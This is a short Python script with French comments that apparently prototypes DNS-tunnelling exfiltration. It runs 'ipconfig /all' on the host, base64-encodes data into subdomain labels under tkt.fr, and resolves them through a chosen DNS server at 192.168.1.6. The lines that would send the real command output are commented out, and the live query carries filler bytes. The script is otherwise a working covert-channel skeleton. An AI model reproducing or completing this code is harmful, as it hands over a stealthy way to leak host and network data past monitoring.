from dns import resolver
import subprocess
import base64
from Crypto.Cipher import AES

HOST = '192.168.1.6'
PORT = 53
CHUNK_LIMIT = 63

"""
def send(data):
    encoded = base64.encode(data).decode()
    domain = f"www.{data}.tkt.fr"
    answer = res.resolve(domain, 'A')
"""

# Créer une instance de resolver
res = resolver.Resolver()

# Spécifier le serveur DNS
res.nameservers = [HOST]
res.port = PORT

command = subprocess.Popen(["ipconfig /all"], shell=True,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)
out, err = command.communicate()

print(len(out))
    
cmd = b"ipconfig /all144949849888888888888888"
cmd2 = b"77777777777777777777777777777777777"
cmd3 = b"8888888888888888888888888888888888"
cmd4 = b"9999999999999999999999999999999999"
encoded_cmd = base64.b64encode(cmd).decode()
encoded_cmd2 = base64.b64encode(cmd2).decode()
encoded_cmd3 = base64.b64encode(cmd3).decode()
encoded_cmd4 = base64.b64encode(cmd4).decode()
out = base64.b64encode(out).decode()
domain = f"{encoded_cmd4}.{encoded_cmd3}.{encoded_cmd2}.{encoded_cmd}.tkt.fr"
#domain2 = f"www..tkt.fr"
#domain3 = f"www.{out}.tkt.fr"
# Faire une requête DNS
answer = res.resolve(domain, 'A')
#answer2 = res.resolve(domain2, 'A')
#anwser3 = res.resolve(domain3, 'A')
#send(b'cd /etc/')

# Afficher la réponse
for ipval in answer:
    print('IP', ipval.to_text())